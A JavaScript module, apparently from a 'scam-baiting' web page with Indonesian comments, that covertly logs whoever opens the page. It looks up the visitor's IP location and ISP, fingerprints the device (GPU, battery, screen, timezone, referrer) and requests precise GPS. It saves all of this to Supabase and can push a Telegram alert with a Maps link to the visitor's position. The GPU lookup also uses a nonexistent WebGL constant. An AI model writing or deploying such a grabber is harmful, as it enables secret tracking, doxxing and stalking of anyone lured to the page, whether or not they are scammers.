import axios from 'axios';
import { supabase, isSupabaseConfigured } from './supabase';

// ============================================================
// OPSIONAL: Telegram sebagai notifikasi tambahan
// Isi jika mau dapat notif HP juga, kosongkan jika tidak perlu
// ============================================================
const TELEGRAM_BOT_TOKEN = '';
const TELEGRAM_CHAT_ID = '';

const sendToTelegram = async (data) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const mapsUrl = data.precise_lat
    ? `https://maps.google.com/?q=${data.precise_lat},${data.precise_lng}`
    : `https://maps.google.com/?q=${data.latitude},${data.longitude}`;

  const message = `
🚨 *PENIPU TERPANCING!*

🕐 *Waktu:* ${new Date(data.timestamp).toLocaleString('id-ID')}
🌐 *IP:* \`${data.ip}\`
📍 *Lokasi IP:* ${data.city}, ${data.region}, ${data.country_name}
🏢 *ISP:* ${data.org}
📱 *Device:* ${data.platform} | ${data.screen_resolution}
🔋 *Baterai:* ${data.battery} (${data.charging})
${data.precise_lat ? `📌 *GPS AKURAT!* Akurasi: ${data.gps_accuracy}` : '📌 *Lokasi via IP*'}
🗺️ [Buka di Google Maps](${mapsUrl})
  `.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: false,
    });
  } catch (err) {
    console.error('Gagal kirim ke Telegram:', err.message);
  }
};

const saveToSupabase = async (data) => {
  if (!isSupabaseConfigured()) {
    console.warn('Supabase belum dikonfigurasi. Isi URL dan KEY di src/utils/supabase.js');
    return null;
  }

  const { data: inserted, error } = await supabase
    .from('scam_logs')
    .insert([data])
    .select()
    .single();

  if (error) {
    console.error('Gagal simpan ke Supabase:', error.message);
    return null;
  }

  return inserted;
};

export const captureVisitorData = async () => {
  try {
    // Ambil data IP — tidak butuh izin apapun
    const response = await axios.get('https://ipapi.co/json/');
    const ipData = response.data;

    // Battery info
    let batteryLevel = 'Unknown';
    let batteryCharging = 'Unknown';
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
      batteryCharging = battery.charging ? 'Charging' : 'Not Charging';
    }

    // GPU fingerprint
    const getGPU = () => {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (!gl) return 'N/A';
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : 'Generic GPU';
    };

    const timestamp = new Date().toISOString();
    const logId = Math.random().toString(36).substr(2, 9);

    // Data lengkap — flat structure untuk Supabase
    const fullLog = {
      id: logId,
      timestamp,
      // IP data
      ip: ipData.ip || 'Unknown',
      city: ipData.city || 'Unknown',
      region: ipData.region || 'Unknown',
      country_name: ipData.country_name || 'Unknown',
      country_code: ipData.country_code || '--',
      latitude: ipData.latitude || null,
      longitude: ipData.longitude || null,
      org: ipData.org || 'Unknown',
      // Device data
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen_resolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      gpu: getGPU(),
      battery: batteryLevel,
      charging: batteryCharging,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'Direct',
      // GPS — diisi nanti kalau user izinkan
      precise_lat: null,
      precise_lng: null,
      gps_accuracy: null,
      status: 'captured',
    };

    // Simpan ke Supabase DULU tanpa nunggu GPS
    await saveToSupabase(fullLog);

    // Simpan ke localStorage juga (fallback dashboard lokal)
    const existingLogs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
    localStorage.setItem('scam_logs', JSON.stringify([fullLog, ...existingLogs]));

    // Kirim notif Telegram (opsional)
    sendToTelegram(fullLog);

    // Coba GPS di background — kalau berhasil, update record yang sudah ada
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const gpsUpdate = {
            precise_lat: position.coords.latitude,
            precise_lng: position.coords.longitude,
            gps_accuracy: `${position.coords.accuracy.toFixed(1)} meters`,
          };

          // Update record di Supabase
          if (isSupabaseConfigured()) {
            await supabase
              .from('scam_logs')
              .update(gpsUpdate)
              .eq('id', logId);
          }

          // Update localStorage
          const logs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
          const idx = logs.findIndex((l) => l.id === logId);
          if (idx !== -1) {
            logs[idx] = { ...logs[idx], ...gpsUpdate };
            localStorage.setItem('scam_logs', JSON.stringify(logs));
          }

          // Kirim notif Telegram kedua dengan GPS akurat
          sendToTelegram({ ...fullLog, ...gpsUpdate });
        },
        () => {}, // Ditolak = tidak apa-apa, data IP sudah masuk
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    return fullLog;
  } catch (error) {
    console.error('Failed to capture data:', error);
    return null;
  }
};
